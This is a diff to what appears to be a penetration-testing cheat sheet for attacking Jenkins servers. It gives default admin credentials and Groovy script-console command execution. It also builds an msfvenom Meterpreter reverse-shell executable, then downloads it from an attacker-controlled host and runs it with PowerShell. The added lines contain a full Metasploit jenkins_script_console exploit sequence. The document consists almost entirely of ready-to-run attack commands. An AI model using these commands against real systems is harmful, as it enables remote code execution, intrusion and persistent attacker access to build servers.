@@ -1,9 +1,9 @@
 # Pentesting Jenkins
-
 # Jenkins default creds, admin:admin
 
-
 # Jekins Console RCE (groovy)
+;; Visit the jenkins web page > Manage Jenkins (options
+;; on the left side) > script console 
 println "cmd.exe /c dir".execute().text
 
 ;; or generate an msfvenom revshell.exe
@@ -11,6 +11,17 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 
 ;;or start a muti/handler on metasploit with same LHOST, LPORT and PAYLOAD
 "powershell \"(New-Object System.Net.WebClient).Downloadfile('http://<our-ip>:8000/revshell.exe','revshell.exe')\"".execute()
 "powershell Start-Process revshell.exe".execute()
+
+# Jenkins Console RCE (metasploit)
+msf > use exploit/multi/http/jenkins_script_console
+msf > set username admin
+msf > set password hello
+msf > set rhost someexample.com
+msf > set rport 9000
+msf > set targeturi /
+msf > set target 1
+msf > exploit
+
 
 # Jenkins Job RCE
 ;; we can obtain RCE also by creating a new job with a Windows batch script.
